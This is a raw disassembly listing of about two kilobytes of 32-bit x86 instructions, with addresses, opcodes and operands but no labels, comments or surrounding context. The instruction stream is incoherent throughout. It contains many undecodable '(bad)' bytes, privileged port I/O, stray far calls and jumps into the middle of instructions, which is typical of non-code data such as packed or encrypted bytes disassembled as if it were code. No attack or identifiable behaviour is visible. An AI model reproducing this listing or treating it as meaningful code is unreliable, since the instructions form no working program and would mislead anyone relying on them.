  40425c:	es cmp eax,0xaba81c4d
  404262:	addr16 adc ebx,ecx
  404265:	or     ebx,DWORD PTR [edx]
  404267:	loope  0x4041f2
  404269:	inc    ebp
  40426a:	aas    
  40426b:	std    
  40426c:	or     eax,DWORD PTR [esi]
  40426e:	lahf   
  40426f:	test   DWORD PTR [esi+0x538bd3d0],eax
  404275:	cs jo  0x4042e9
  404278:	aad    0xd4
  40427a:	icebp  
  40427b:	dec    esi
  40427c:	push   cs
  40427d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40427e:	mov    eax,ds:0x725e3f07
  404283:	arpl   WORD PTR [ebp+0x48],sp
  404286:	sbb    eax,0x5154e138
  40428b:	mov    ebx,0xd7280f04
  404290:	ds and al,0xfe
  404293:	mov    bl,0x56
  404295:	in     al,dx
  404296:	xor    esi,ebx
  404298:	adc    eax,0x8ec38459
  40429d:	mov    gs,edx
  40429f:	and    al,0x78
  4042a1:	mov    ebp,0xb14ad915
  4042a6:	jbe    0x40423f
  4042a8:	int3   
  4042a9:	fwait
  4042aa:	outs   dx,BYTE PTR ds:[esi]
  4042ab:	push   ebx
  4042ac:	and    eax,0xd6246a34
  4042b1:	outs   dx,BYTE PTR ds:[esi]
  4042b2:	mov    ebx,0xc6d31380
  4042b7:	mov    BYTE PTR [ebx+0xe28a0fc],bh
  4042bd:	adc    edi,DWORD PTR [eax]
  4042bf:	sbb    esp,DWORD PTR [esi]
  4042c1:	or     eax,0xcae1fed1
  4042c6:	mov    eax,ds:0x63103feb
  4042cb:	pop    edi
  4042cc:	mov    edi,fs
  4042ce:	sti    
  4042cf:	sbb    ebx,DWORD PTR [ecx]
  4042d1:	mov    al,ds:0xdee48284
  4042d6:	bound  ecx,QWORD PTR [esi+0x3]
  4042d9:	cmc    
  4042da:	push   ebp
  4042db:	bound  eax,QWORD PTR [eax+edx*2]
  4042de:	loop   0x404312
  4042e0:	rcr    BYTE PTR [ebx-0x3766800b],0xd0
  4042e7:	cmc    
  4042e8:	mov    DWORD PTR ds:0x4b29bf2b,esp
  4042ee:	shl    esi,1
  4042f0:	mov    cl,0x9e
  4042f2:	jmp    0x404344
  4042f4:	xchg   esi,eax
  4042f5:	repz jnp 0x40435d
  4042f8:	data16 fidivr WORD PTR [eax+0x732d7eb2]
  4042ff:	add    edx,edi
  404301:	mov    DWORD PTR [edi],esp
  404303:	(bad)  
  404304:	addr16 out 0xab,al
  404307:	dec    eax
  404308:	xchg   esi,eax
  404309:	mov    esi,0xc4872fde
  40430e:	or     DWORD PTR [eax+0x6c],0xffffffcf
  404312:	sbb    al,BYTE PTR [eax+0x55]
  404315:	sbb    eax,DWORD PTR [ebx-0x23]
  404318:	adc    ah,ah
  40431a:	mov    dh,0xba
  40431c:	mov    bh,dl
  40431e:	cmp    ebx,DWORD PTR [esi+0x14]
  404321:	lds    edx,FWORD PTR [edx]
  404323:	xor    eax,0xa350fe2b
  404328:	(bad)  
  404329:	dec    BYTE PTR [eax]
  40432b:	jg     0x40430d
  40432d:	add    esp,DWORD PTR [edx-0x61]
  404330:	call   0x5fb5:0xd3ce3cdf
  404337:	pop    esp
  404338:	shl    BYTE PTR [ebx-0x6037dbb9],1
  40433e:	ficom  WORD PTR ds:0xbed11e35
  404344:	nop
  404345:	jb     0x4043b6
  404347:	int3   
  404348:	dec    ebx
  404349:	sbb    dl,BYTE PTR [edx]
  40434b:	jne    0x404395
  40434d:	xchg   ecx,eax
  40434e:	rcr    DWORD PTR [ecx+0x1f],cl
  404351:	loop   0x40438b
  404353:	adc    ebp,DWORD PTR [ebp+esi*8+0x33]
  404357:	push   es
  404358:	test   DWORD PTR [ecx-0x1a],ebp
  40435b:	cmp    eax,edi
  40435d:	retw   
  40435f:	push   esi
  404360:	adc    al,bh
  404362:	stos   BYTE PTR es:[edi],al
  404363:	cmp    al,bh
  404365:	stos   DWORD PTR es:[edi],eax
  404366:	pop    ecx
  404367:	retf   
  404368:	outs   dx,DWORD PTR ds:[esi]
  404369:	loop   0x4043c7
  40436b:	jl     0x40430d
  40436d:	(bad)
  404371:	mov    al,0xd0
  404373:	fidivr DWORD PTR [ecx+0x11ebcc1e]
  404379:	pushf  
  40437a:	outs   dx,BYTE PTR ds:[esi]
  40437b:	loopne 0x404382
  40437d:	into   
  40437e:	and    DWORD PTR [esi],ebx
  404380:	mov    bh,0xc
  404382:	sti    
  404383:	xor    esp,DWORD PTR [ebp+0x3c]
  404386:	inc    esp
  404387:	xor    al,0xc3
  404389:	shr    BYTE PTR [esi+0x389838f3],cl
  40438f:	loope  0x40433e
  404391:	and    eax,0xc9a413cd
  404396:	repz enter 0x1a80,0x93
  40439b:	rcr    DWORD PTR [eax+0x2dc61d3d],1
  4043a1:	mov    WORD PTR [edx+0x44],?
  4043a4:	fdiv   DWORD PTR [ebx+eiz*8+0x29]
  4043a8:	ret    
  4043a9:	adc    ecx,DWORD PTR [esi+0xa]
  4043ac:	shl    BYTE PTR [esp+esi*4],cl
  4043af:	ret    0x233b
  4043b2:	adc    edx,DWORD PTR [edx+ebp*2-0x23]
  4043b6:	xchg   esi,eax
  4043b7:	nop
  4043b8:	(bad)  
  4043ba:	shl    BYTE PTR [esi-0x50c1ee96],cl
  4043c0:	ror    BYTE PTR [esi+0x1b],cl
  4043c3:	cmp    eax,0xcabdd97b
  4043c8:	fdiv   DWORD PTR [ebx+ebp*8+0x7b]
  4043cc:	ficom  WORD PTR [edx+0x2d0ed826]
  4043d2:	enter  0x97e0,0xcc
  4043d6:	(bad)  
  4043d8:	mov    BYTE PTR [esp+eax*1+0x1e5ab16c],ah
  4043df:	xchg   esi,eax
  4043e0:	jo     0x404408
  4043e2:	xchg   edx,eax
  4043e3:	dec    edi
  4043e4:	mov    BYTE PTR ds:0xb5e4f534,al
  4043ea:	jg     0x404456
  4043ec:	inc    esp
  4043ed:	lock sub al,0x18
  4043f0:	out    dx,eax
  4043f1:	add    eax,0xb5ddb2dc
  4043f6:	cmp    ebx,esp
  4043f8:	cmp    ch,dl
  4043fa:	ret    0x7742
  4043fd:	retf   
  4043fe:	mov    DWORD PTR [edx-0x7dbe3387],eax
  404404:	repnz adc al,0x15
  404407:	div    BYTE PTR [edi+0x45]
  40440a:	nop
  40440b:	jbe    0x4043fd
  40440d:	push   ecx
  40440e:	xchg   edx,eax
  40440f:	(bad)  [ebp+0x65]
  404412:	ret    
  404413:	fs sbb eax,0x98799378
  404419:	mov    eax,0x27d64a7d
  40441e:	ds dec ebx
  404420:	push   esi
  404421:	or     al,0xde
  404423:	or     DWORD PTR [eax-0x7789f1b6],0x8d17143d
  40442d:	loop   0x4043bd
  40442f:	loopne 0x4043dc
  404431:	pop    ss
  404432:	push   ebp
  404433:	les    ebp,FWORD PTR [ebx+eax*4+0xf]
  404437:	out    0x84,al
  404439:	sub    esp,DWORD PTR [eax]
  40443b:	and    DWORD PTR [edi-0x17aa5169],edx
  404441:	mov    esi,0x2054e384
  404446:	je     0x404481
  404448:	fadd   DWORD PTR [ebx-0x24]
  40444b:	jne    0x40443a
  40444d:	jmp    0x4043ee
  40444f:	popfw  
  404451:	out    dx,al
  404452:	test   BYTE PTR [edx-0x2b],bl
  404455:	loopne 0x4044a9
  404457:	ins    BYTE PTR es:[edi],dx
  404458:	ret    0xd660
  40445b:	fild   DWORD PTR [ecx+edx*2+0x19]
  40445f:	add    al,0xd9
  404461:	pop    ds
  404462:	sbb    edx,DWORD PTR [eax]
  404464:	add    DWORD PTR [edi+0x9],esi
  404467:	jmp    0x404441
  404469:	shr    edx,cl
  40446b:	cs cmc 
  40446d:	cmp    DWORD PTR [edx+0x55b30f6c],esp
  404473:	mov    BYTE PTR [ebp-0x8bd1674],bh
  404479:	push   es
  40447a:	inc    edi
  40447b:	mov    ds:0x8a9b6cda,eax
  404480:	idiv   BYTE PTR [esp+ebp*4+0x2a]
  404484:	rcr    BYTE PTR [edx+0x188df355],cl
  40448a:	dec    edx
  40448b:	mov    al,0x71
  40448d:	addr16 inc esi
  40448f:	retf   
  404490:	push   0xffffffaf
  404492:	fisub  WORD PTR [edi+0x78]
  404495:	xchg   ebx,eax
  404496:	test   DWORD PTR [eax],esi
  404498:	ins    DWORD PTR es:[edi],dx
  404499:	dec    esp
  40449a:	pop    edi
  40449b:	cli    
  40449c:	jge    0x404476
  40449e:	int    0xa9
  4044a0:	cmp    DWORD PTR [eax+0x323552f3],ebx
  4044a6:	fstp   DWORD PTR [edx]
  4044a8:	mov    ebp,0xd2ade951
  4044ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044ae:	jmp    0x404484
  4044b0:	add    al,BYTE PTR [ebp-0x2f96fccc]
  4044b6:	jle    0x404522
  4044b8:	and    DWORD PTR [ecx-0x38],esi
  4044bb:	inc    edx
  4044bc:	out    0x1c,eax
  4044be:	adc    bh,BYTE PTR [esi]
  4044c0:	jge    0x40453f
  4044c2:	push   ecx
  4044c3:	fisub  WORD PTR [edi]
  4044c5:	mov    ch,0x7b
  4044c7:	(bad)  
  4044c8:	scas   eax,DWORD PTR es:[edi]
  4044c9:	aaa    
  4044ca:	imul   ebp,DWORD PTR [ebx-0x79],0x19
  4044ce:	xchg   ecx,eax
  4044cf:	popa   
  4044d0:	retf   0xe4d8
  4044d3:	xor    BYTE PTR [edi+edi*8-0x197d0e82],dh
  4044da:	stc    
  4044db:	outs   dx,BYTE PTR ds:[esi]
  4044dc:	pop    esp
  4044dd:	push   esp
  4044de:	ret    
  4044df:	push   ss
  4044e0:	jne    0x4044b3
  4044e2:	mov    dh,0x7f
  4044e4:	loope  0x40455a
  4044e6:	test   DWORD PTR [ebp+0x649dd033],esp
  4044ec:	mov    cl,0x9f
  4044ee:	jbe    0x40453f
  4044f0:	(bad)
  4044f5:	xchg   edx,eax
  4044f6:	int3   
  4044f7:	inc    ebx
  4044f8:	repz js 0x404483
  4044fb:	ror    BYTE PTR [eax+edi*2],0xd9
  4044ff:	adc    edx,DWORD PTR [ecx+eiz*2]
  404502:	test   DWORD PTR [edx+0x3599066d],0x7af0935
  40450c:	fidivr DWORD PTR [eax+edi*2+0x42]
  404510:	cld    
  404511:	mov    ds:0x8d1d5920,al
  404516:	and    eax,0x2a202e4c
  40451b:	enter  0x3013,0x8c
  40451f:	and    ecx,DWORD PTR [eax+0x8a63496]
  404525:	pop    ecx
  404526:	mov    edi,0x637901d3
  40452b:	pop    edx
  40452c:	mov    ecx,0x2b3ee46
  404531:	fdivr  DWORD PTR [edi-0x31]
  404534:	xchg   edi,eax
  404535:	add    BYTE PTR [edi],0x6b
  404538:	or     edx,ebx
  40453a:	out    0x2,eax
  40453c:	and    eax,0x9d69ad4b
  404541:	pop    edx
  404542:	lods   al,BYTE PTR ds:[esi]
  404543:	sub    al,0x7f
  404545:	loopne 0x40452b
  404547:	dec    esi
  404548:	mov    ebx,0xf9300182
  40454d:	lods   al,BYTE PTR ds:[esi]
  40454e:	add    DWORD PTR [eax-0x71ec90b9],ebx
  404554:	dec    edx
  404555:	fimul  DWORD PTR [ebx+0x17]
  404558:	stos   DWORD PTR es:[edi],eax
  404559:	push   edi
  40455a:	xchg   ecx,eax
  40455b:	xchg   edx,eax
  40455c:	test   DWORD PTR [edx+0x643c433a],edi
  404562:	xchg   BYTE PTR [ebx+ebp*1-0x38],dl
  404566:	mov    bh,0xb8
  404568:	mov    al,ds:0x74e44955
  40456d:	mov    bh,0x99
  40456f:	je     0x4045ed
  404571:	fs pushf 
  404573:	jo     0x4045aa
  404575:	(bad)  
  404576:	cmc    
  404577:	mov    bl,0x22
  404579:	xlat   BYTE PTR ds:[ebx]
  40457a:	push   cs
  40457b:	cmp    esp,DWORD PTR [ebx-0x64]
  40457e:	mov    dl,0x3b
  404580:	addr16 std 
  404582:	sbb    esi,ebx
  404584:	popa   
  404585:	xor    BYTE PTR [ecx+0x36],dh
  404588:	jnp    0x404524
  40458a:	es loopne 0x404552
  40458d:	cmp    DWORD PTR [ecx],0x31
  404590:	or     eax,0x1114d2f5
  404595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404596:	mov    bl,0x23
  404598:	nop
  404599:	and    al,0xd4
  40459b:	pushf  
  40459c:	jge    0x404561
  40459e:	les    edx,FWORD PTR [ebp+0x72cefeeb]
  4045a4:	daa    
  4045a5:	cmc    
  4045a6:	mov    bh,0x5a
  4045a8:	ret    
  4045a9:	lds    ebp,FWORD PTR [edx+eax*4]
  4045ac:	int3   
  4045ad:	add    eax,0x5b1f1952
  4045b2:	aaa    
  4045b3:	jle    0x404550
  4045b5:	inc    edi
  4045b6:	push   es
  4045b7:	fdivr  QWORD PTR [esi-0x24d1f2d8]
  4045bd:	mov    al,0x4f
  4045bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045c0:	add    esi,DWORD PTR [ebp-0x51]
  4045c3:	(bad)  
  4045c4:	in     al,dx
  4045c5:	fwait
  4045c6:	push   ecx
  4045c7:	mov    al,ds:0x7098c28b
  4045cc:	xlat   BYTE PTR ds:[ebx]
  4045cd:	cmp    DWORD PTR [ebx-0x21],esi
  4045d0:	xor    BYTE PTR [edx-0x16e8d166],dh
  4045d6:	mov    BYTE PTR [ecx],cl
  4045d8:	sbb    al,0x2f
  4045da:	sbb    al,0x7b
  4045dc:	xchg   esi,eax
  4045dd:	gs jp  0x4045fc
  4045e0:	lock (bad) 
  4045e2:	int    0x4f
  4045e4:	jge    0x4045ed
  4045e6:	stos   BYTE PTR es:[edi],al
  4045e7:	pop    ebp
  4045e8:	sub    esp,DWORD PTR [esi]
  4045ea:	cmp    eax,0x82aca9ed
  4045ef:	shl    esi,0xda
  4045f2:	jo     0x40459a
  4045f4:	js     0x404626
  4045f6:	mov    dl,0x4b
  4045f8:	jmp    edx
  4045fa:	sbb    DWORD PTR cs:[edx],0xffffffd1
  4045fe:	cmp    eax,0xcd77f514
  404603:	or     ch,ch
  404605:	ret    
  404606:	fwait
  404607:	iret   
  404608:	and    BYTE PTR [eax],bh
  40460a:	mov    ds:0xffba7f4c,eax
  40460f:	mov    ds:0x7d769f24,al
  404614:	cmp    al,0x47
  404616:	push   ecx
  404617:	sub    eax,0x27d46605
  40461c:	sbb    dl,al
  40461e:	mov    edi,ebp
  404620:	ins    DWORD PTR es:[edi],dx
  404621:	sar    edi,0xf2
  404624:	call   0x5fbe3060
  404629:	in     eax,dx
  40462a:	pop    ds
  40462b:	jae    0x404607
  40462d:	(bad)  
  40462e:	(bad)  
  404630:	jecxz  0x4045db
  404632:	push   ecx
  404633:	jmp    DWORD PTR [ecx-0x2f33ae1b]
  404639:	and    DWORD PTR [edi+0x3351d000],ebp
  40463f:	cmc    
  404640:	int    0x36
  404642:	mov    ds:0xfc19d334,eax
  404647:	shl    DWORD PTR [ebp-0x56],0x80
  40464b:	lea    edi,[esi+0x4b]
  40464e:	fiadd  DWORD PTR [eax+edx*1-0x6b]
  404652:	aad    0xbb
  404654:	jg     0x404609
  404656:	pop    ebp
  404657:	cmp    ecx,esi
  404659:	and    al,0x52
  40465b:	loop   0x40469d
  40465d:	ds inc ebp
  40465f:	int3   
  404660:	inc    edx
  404661:	comiss xmm6,xmm3
  404664:	icebp  
  404665:	rep ins DWORD PTR es:[di],dx
  404668:	loopne 0x404691
  40466a:	sahf   
  40466b:	stos   DWORD PTR es:[edi],eax
  40466c:	mov    dl,0x39
  40466e:	ds stc 
  404670:	sbb    DWORD PTR [edx],esi
  404672:	sub    ch,BYTE PTR [edi+esi*8-0x67]
  404676:	pop    esp
  404677:	jg     0x404690
  404679:	in     al,0xf
  40467b:	and    bh,BYTE PTR [edi]
  40467d:	nop
  40467e:	mov    DWORD PTR [ebx+ebp*2+0x48],0x64f402dc
  404686:	sub    BYTE PTR [edx+0x5f30b9d1],0x7f
  40468d:	adc    DWORD PTR [edx+0x31184045],esp
  404693:	test   BYTE PTR [esi],ch
  404695:	rcl    DWORD PTR [ecx],cl
  404697:	push   eax
  404698:	sbb    dl,cl
  40469a:	sbb    esp,esp
  40469c:	xchg   edi,eax
  40469d:	(bad)  
  40469e:	sub    DWORD PTR [eax-0x43],ebp
  4046a1:	in     al,dx
  4046a2:	ins    DWORD PTR es:[edi],dx
  4046a3:	sar    DWORD PTR [ecx],1
  4046a5:	aaa    
  4046a6:	xchg   edx,eax
  4046a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046a8:	add    BYTE PTR [ecx],bl
  4046aa:	push   0x7c538885
  4046af:	mov    ds,WORD PTR [ecx]
  4046b1:	mov    bh,0x7a
  4046b3:	xchg   edi,eax
  4046b4:	xor    dh,BYTE PTR [esp+ebp*4+0x5cc18b60]
  4046bb:	leave  
  4046bc:	lahf   
  4046bd:	popf   
  4046be:	das    
  4046bf:	or     DWORD PTR [eax+ecx*2+0xef45a4],edi
  4046c6:	stos   DWORD PTR es:[edi],eax
  4046c7:	shl    BYTE PTR [edi-0x4c],1
  4046ca:	retf   
  4046cb:	lds    ebp,FWORD PTR [ecx-0x78]
  4046ce:	pop    esp
  4046cf:	popf   
  4046d0:	inc    edx
  4046d1:	sub    ebp,ebx
  4046d3:	pop    edi
  4046d4:	fidiv  WORD PTR [eax*1+0x3c06f0c7]
  4046db:	clc    
  4046dc:	push   ss
  4046dd:	dec    eax
  4046de:	daa    
  4046df:	mov    esp,0x7509ed0
  4046e4:	xchg   edx,eax
  4046e5:	mov    eax,ds:0xbb294331
  4046ea:	jmp    0x6f44671
  4046ef:	xchg   BYTE PTR [ebp-0x35ab3d41],dl
  4046f5:	fucomp st(4)
  4046f7:	shl    DWORD PTR [ebp-0x1be9237d],0xa5
  4046fe:	retf   0xf464
  404701:	cmp    al,BYTE PTR [ebp-0x9]
  404704:	icebp  
  404705:	ins    DWORD PTR es:[edi],dx
  404706:	cmp    al,0x8
  404708:	push   cs
  404709:	cdq    
  40470a:	in     al,dx
  40470b:	push   0xffffffe6
  40470d:	jg     0x4046f2
  40470f:	(bad)  
  404710:	fcom   DWORD PTR [ebx-0x53]
  404713:	repnz mov al,0x22
  404716:	mov    ecx,0xcfe16f94
  40471b:	jne    0x40476e
  40471d:	jle    0x404707
  40471f:	push   esp
  404720:	(bad)  
  404721:	arpl   WORD PTR [esi],ax
  404723:	daa    
  404724:	daa    
  404725:	lds    esp,FWORD PTR [ecx]
  404727:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404728:	popa   
  404729:	jl     0x404793
  40472b:	adc    eax,0x31ca7085
  404730:	sub    ch,BYTE PTR [esp+edi*8-0x4a]
  404734:	and    DWORD PTR [eax+ecx*4+0x66],edx
  404738:	loopne 0x404708
  40473a:	and    al,0x70
  40473c:	shr    ebp,0x9b
  40473f:	jnp    0x404783
  404741:	std    
  404742:	mov    BYTE PTR [esi+0x3a],dl
  404745:	out    0x43,eax
  404747:	and    esi,DWORD PTR [esi]
  404749:	nop
  40474a:	aam    0x8f
  40474c:	fld    QWORD PTR [eax+esi*2-0x6e]
  404750:	(bad)  
  404751:	mov    al,ds:0xa5a223cc
  404756:	push   ecx
  404757:	and    ah,al
  404759:	stos   BYTE PTR es:[edi],al
  40475a:	mov    ecx,0x98807ea7
  40475f:	jle    0x404743
  404761:	jg     0x404769
  404763:	sub    dh,BYTE PTR [eax+0x3d]
  404766:	mov    edx,0x84d2767f
  40476b:	mov    esp,0x91621d99
  404770:	mov    DWORD PTR [edi+eiz*2],ebp
  404773:	inc    ebp
  404774:	xchg   edx,eax
  404775:	imul   ebx,DWORD PTR [ecx],0xffffffff
  404778:	imul   esp,DWORD PTR [ebx+0x5a],0xfffffffa
  40477c:	es inc ebx
  40477e:	inc    eax
  40477f:	mov    edi,0x28bdbc2e
  404784:	in     al,0x67
  404786:	push   edx
  404787:	retf   0xffb3
  40478a:	loope  0x4047b0
  40478c:	sar    BYTE PTR fs:[ebp-0x14],cl
  404790:	jnp    0x404729
  404792:	or     eax,DWORD PTR [edi]
  404794:	es push es
  404796:	or     esp,DWORD PTR es:[ebp+0x21]
  40479a:	aas    
  40479b:	push   0xfcb0b9ec
  4047a0:	lods   eax,DWORD PTR ds:[esi]
  4047a1:	hlt    
  4047a2:	pop    eax
  4047a3:	pop    ebx
  4047a4:	adc    DWORD PTR [eax],edx
  4047a6:	jno    0x40475c
  4047a8:	fisttp WORD PTR [esi+0xc4dde1]
  4047ae:	sbb    al,0xba
  4047b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047b1:	scas   ax,WORD PTR es:[edi]
  4047b3:	xchg   edx,eax
  4047b4:	jno    0x4047d8
  4047b6:	cmp    BYTE PTR [ecx+0x100983c4],ah
  4047bc:	xchg   edx,eax
  4047bd:	push   esi
  4047be:	push   edi
  4047bf:	gs jbe 0x40482c
  4047c2:	sbb    al,0xcb
  4047c4:	push   edi
  4047c5:	repz ret 0x7e9e
  4047c9:	mov    esi,0xc08a2413
  4047ce:	(bad)  
  4047cf:	sub    al,0x4c
  4047d1:	retf   0xb0af
  4047d4:	jo     0x404765
  4047d6:	iret   
  4047d7:	addr16 or al,0xdc
  4047da:	fsubr  QWORD PTR [edx+0x5666fd90]
  4047e0:	inc    eax
  4047e1:	mov    dh,0x22
  4047e3:	mov    BYTE PTR [eax],dl
  4047e5:	cdq    
  4047e6:	or     BYTE PTR [edi-0x71696c14],bh
  4047ec:	add    eax,0x95779149
  4047f1:	ja     0x4047f2
  4047f3:	cmp    ecx,DWORD PTR [ecx+0x4b]
  4047f6:	cmp    DWORD PTR [eax+0x2a],eax
  4047f9:	cmp    al,0x2b
  4047fb:	add    al,0xaa
  4047fd:	xchg   edx,eax
  4047fe:	cmp    DWORD PTR [edi],ebp
  404800:	adc    ah,ah
  404802:	jmp    0x404840
  404804:	ret    
  404805:	int3   
  404806:	outs   dx,BYTE PTR ds:[esi]
  404807:	test   DWORD PTR [eax+0x6b98ce82],0x87557de3
  404811:	lods   eax,DWORD PTR ds:[esi]
  404812:	mov    edi,0x942d8ca4
  404817:	(bad)  
  404818:	fdivr  QWORD PTR [esi-0x2638de5f]
  40481e:	push   edi
  40481f:	stos   DWORD PTR es:[edi],eax
  404820:	addr16 push esp
  404822:	adc    al,0x4e
  404824:	fwait
  404825:	dec    eax
  404826:	cwde   
  404827:	mov    ebx,0xf97e7843
  40482c:	in     al,0x10
  40482e:	pop    esp
  40482f:	imul   ebp,DWORD PTR [eax-0x3c],0x51
  404833:	mov    ebp,0x1705b590
  404838:	sbb    ch,BYTE PTR ss:[esi+0xa]
  40483c:	jge    0x404841
  40483e:	fisubr WORD PTR [ebx+edi*1]
  404841:	rcr    bh,1
  404843:	sbb    BYTE PTR [edi],bh
  404845:	jg     0x4048c3
  404847:	mov    eax,ds:0x6643bdc2
  40484c:	dec    ebx
  40484d:	rcr    DWORD PTR [edi],0x67
  404850:	dec    eax
  404851:	fild   DWORD PTR [ecx+0x62]
  404854:	xchg   esi,eax
  404855:	mov    al,ds:0x32be34ec
  40485a:	pop    edi
  40485b:	or     eax,0xa5db72d3
  404860:	mov    edi,0xf19d4f48
  404865:	xor    al,0xe8
  404867:	outs   dx,BYTE PTR ds:[esi]
  404868:	loope  0x4048a6
  40486a:	daa    
  40486b:	das    
  40486c:	xchg   ecx,eax
  40486d:	(bad)  
  40486e:	mov    eax,ds:0xbe417f5d
  404873:	sub    ebp,ebx
  404875:	lahf   
  404876:	loop   0x404808
  404878:	inc    esi
  404879:	test   BYTE PTR [edi-0x16],ah
  40487c:	std    
  40487d:	xchg   esp,eax
  40487e:	enter  0x932b,0x3c
  404882:	dec    esp
  404883:	das    
  404884:	test   BYTE PTR [ebx+0x7f702505],ah
  40488a:	mov    ds:0x5d499013,eax
  40488f:	sbb    eax,0x5402ce08
  404894:	sbb    BYTE PTR [ebx+0x310be792],0x46
  40489b:	sub    DWORD PTR [eax-0x49],esp
  40489e:	aad    0xf5
  4048a0:	cmp    DWORD PTR [eax-0x77],edx
  4048a3:	adc    al,bh
  4048a5:	cmp    bh,bh
  4048a7:	call   0x77eb663c
  4048ac:	and    ah,BYTE PTR [edx+edi*2]
  4048af:	push   edi
  4048b0:	in     al,0x24
  4048b2:	cmp    BYTE PTR [edx-0x68],cl
  4048b5:	jmp    0x7a41:0xabbe705e
  4048bc:	jbe    0x40492f
  4048be:	ja     0x4048c9
  4048c0:	outs   dx,BYTE PTR ds:[esi]
  4048c1:	xchg   esp,eax
  4048c2:	add    al,0x5a
  4048c4:	dec    ebp
  4048c5:	sbb    DWORD PTR ds:0x45c6deba,eax
  4048cb:	lahf   
  4048cc:	xchg   edi,eax
  4048cd:	mov    al,0xc4
  4048cf:	add    BYTE PTR [edi],cl
  4048d1:	xor    ch,cl
  4048d3:	fld    DWORD PTR [ebx-0x29a0bf9]
  4048d9:	dec    esp
  4048da:	mov    ch,0xc2
  4048dc:	repnz fidivr DWORD PTR ds:0x5cf204dd
  4048e3:	out    0xcd,eax
  4048e5:	jle    0x404963
  4048e7:	dec    ebx
  4048e8:	mov    fs,WORD PTR [edx+0x31a94491]
  4048ee:	push   esi
  4048ef:	(bad)  
  4048f0:	jne    0x40493f
  4048f2:	xor    eax,0xd796a98f
  4048f7:	pop    esi
  4048f8:	dec    edx
  4048f9:	xor    edi,eax
  4048fb:	popf   
  4048fc:	rcl    DWORD PTR [edx+0x601ec12d],0x0
  404903:	mov    ecx,0x3d4b2b73
  404908:	jg     0x40490b
  40490a:	aaa    
  40490b:	aas    
  40490c:	int3   
  40490d:	xchg   esi,eax
  40490e:	adc    BYTE PTR [esi-0x7f],ah
  404911:	out    0x70,al
  404913:	and    eax,0x9791013f
  404918:	mov    edi,0xd508c1c2
  40491d:	outs   dx,BYTE PTR ds:[esi]
  40491e:	dec    ebp
  40491f:	pop    es
  404920:	mov    al,0x7d
  404922:	imul   ebx,DWORD PTR [ecx],0x974a5a4b
  404928:	loope  0x40494d
  40492a:	xchg   ebx,eax
  40492b:	loope  0x4048b1
  40492d:	jne    0x40494b
  40492f:	sbb    BYTE PTR [edi+0x1ef2a484],ch
  404935:	pop    ecx
  404936:	cld    
  404937:	rcl    DWORD PTR [esi+0x7942f188],cl
  40493d:	xchg   edi,edi
  40493f:	lahf   
  404940:	call   0x5105:0xd922b2dd
  404947:	jb     0x4048f2
  404949:	inc    esp
  40494a:	idiv   edi
  40494c:	sub    eax,0x31935346
  404951:	pop    esi
  404952:	jb     0x40493f
  404954:	js     0x404939
  404956:	push   edx
  404957:	mov    eax,0x992b37fc
  40495c:	push   edi
  40495d:	xchg   DWORD PTR [ecx],ecx
  40495f:	js     0x404922
  404961:	mov    dl,BYTE PTR [edi]
  404963:	mov    WORD PTR [edi+0x2e70bffe],cs
  404969:	cli    
  40496a:	int    0x39
  40496c:	adc    dl,dl
  40496e:	sbb    al,0x62
  404970:	jge    0x404946
  404972:	jne    0x404976
  404974:	cmp    BYTE PTR [ebp-0x184efddf],bh
  40497a:	test   eax,0x55e08e13
  40497f:	jae    0x4049df
  404981:	pushf  
  404982:	imul   esp,DWORD PTR [edi+edx*1-0x4a],0xffffffbe
  404987:	jb     0x4049da
  404989:	adc    al,0xce
  40498b:	pop    ebx
  40498c:	cmc    
  40498d:	mov    ecx,0x70a60440
  404992:	pop    edx
  404993:	xchg   edx,eax
  404994:	cli    
  404995:	ins    DWORD PTR es:[edi],dx
  404996:	mov    ebp,0xc3cea101
  40499b:	sub    DWORD PTR ds:0xf4a44741,0xffffffff
  4049a2:	sub    DWORD PTR [ebp+0x14],edi
  4049a5:	out    dx,al
  4049a6:	std    
  4049a7:	xchg   BYTE PTR [edx+0x70],ch
  4049aa:	fstp   TBYTE PTR [ecx+0xf]
  4049ad:	(bad)  
  4049ae:	daa    
  4049af:	sub    al,0x5b
  4049b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049b2:	pushf  
  4049b3:	pop    edi
  4049b4:	pop    ss
  4049b5:	cdq    
  4049b6:	add    eax,0x9d021d77
  4049bb:	outs   dx,DWORD PTR ds:[esi]
  4049bc:	loope  0x404a01
  4049be:	(bad)  
  4049bf:	(bad)  
  4049c1:	jne    0x404a35
  4049c3:	inc    ecx
  4049c4:	dec    ebp
  4049c5:	mov    cl,0xe
  4049c7:	cmc    
  4049c8:	xchg   DWORD PTR [edi-0x51dcd41c],esi
  4049ce:	lods   al,BYTE PTR ds:[esi]
  4049cf:	test   al,0xf4
  4049d1:	push   ebp
  4049d2:	or     al,0x5a
  4049d4:	fstp   QWORD PTR [edx-0x6e]
  4049d7:	js     0x404a34
  4049d9:	sbb    cl,BYTE PTR [ebp-0x48]
  4049dc:	inc    ebp
  4049dd:	pop    ds
  4049de:	adc    edi,ebp
  4049e0:	in     al,0x1b
  4049e2:	jne    0x404a58
  4049e4:	push   ebp
  4049e5:	fimul  WORD PTR [ebp-0x2a]
  4049e8:	out    dx,al
  4049e9:	fdiv   DWORD PTR [ecx]
  4049eb:	cmp    DWORD PTR [ecx],ecx
  4049ed:	jmp    0xceee:0x3286b67
  4049f4:	test   BYTE PTR [edx+0x4c],0xac
  4049f8:	inc    ecx
  4049f9:	mov    ebx,0x1cf8eaa1
  4049fe:	push   es
  4049ff:	pusha  
  404a00:	mov    DWORD PTR [esi],0x39894cd4
  404a06:	aad    0xc4
  404a08:	inc    eax
  404a09:	mov    eax,DWORD PTR [edi]
  404a0b:	jecxz  0x4049a5
  404a0d:	inc    esi
  404a0e:	out    dx,al
  404a0f:	add    bl,dl
  404a11:	inc    ebx
  404a12:	pop    eax
  404a13:	xchg   esp,eax
  404a14:	inc    ecx
  404a15:	stc    
  404a16:	stos   DWORD PTR es:[edi],eax
  404a17:	je     0x404a7d
  404a19:	adc    eax,0xa79204f7
  404a1e:	cmp    al,0x81
  404a20:	add    eax,0x1b2c3e5e
